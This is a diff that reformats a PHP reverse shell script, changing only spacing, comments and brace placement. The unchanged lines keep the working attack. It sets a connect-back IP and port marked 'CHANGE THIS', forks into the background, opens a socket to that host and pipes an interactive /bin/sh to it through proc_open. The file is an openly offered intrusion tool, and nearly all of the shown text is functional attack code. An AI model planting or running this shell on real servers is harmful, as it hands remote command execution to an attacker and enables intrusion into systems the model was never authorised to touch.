@@ -1,6 +1,6 @@
 <?php
 
-set_time_limit (0);
+set_time_limit(0);
 $VERSION = "1.0";
 $ip = '192.168.65.128';  // CHANGE THIS
 $port = 4444;       // CHANGE THIS
@@ -11,21 +11,19 @@ $shell = 'uname -a; w; id; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
 
-//
 // Daemonise ourself if possible to avoid zombies later
-//
 
 // pcntl_fork is hardly ever available, but will allow us to daemonise
 // our php process and avoid zombies.  Worth a try...
 if (function_exists('pcntl_fork')) {
 	// Fork and have the parent process exit
 	$pid = pcntl_fork();
-	
+
 	if ($pid == -1) {
 		printit("ERROR: Can't fork");
 		exit(1);
 	}
-	
+
 	if ($pid) {
 		exit(0);  // Parent exits
 	}
@@ -48,9 +46,7 @@ chdir("/");
 // Remove any umask we inherited
 umask(0);
 
-//
 // Do the reverse shell...
-//
 
 // Open reverse connection
 $sock = fsockopen($ip, $port, $errno, $errstr, 30);
@@ -61,9 +57,9 @@ if (!$sock) {
 
 // Spawn shell process
 $descriptorspec = array(
-   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
-   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
-   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+	0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+	1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+	2 => array("pipe", "w")   // stderr is a pipe that the child will write to
 );
 
 $process = proc_open($shell, $descriptorspec, $pipes);
@@ -136,13 +132,11 @@ proc_close($process);
 
 // Like print, but does nothing if we've daemonised ourself
 // (I can't figure out how to redirect STDOUT like a proper daemon)
-function printit ($string) {
+function printit($string)
+{
 	if (!$daemon) {
 		print "$string\n";
 	}
 }
 
-?> 
-
-
-
+?>
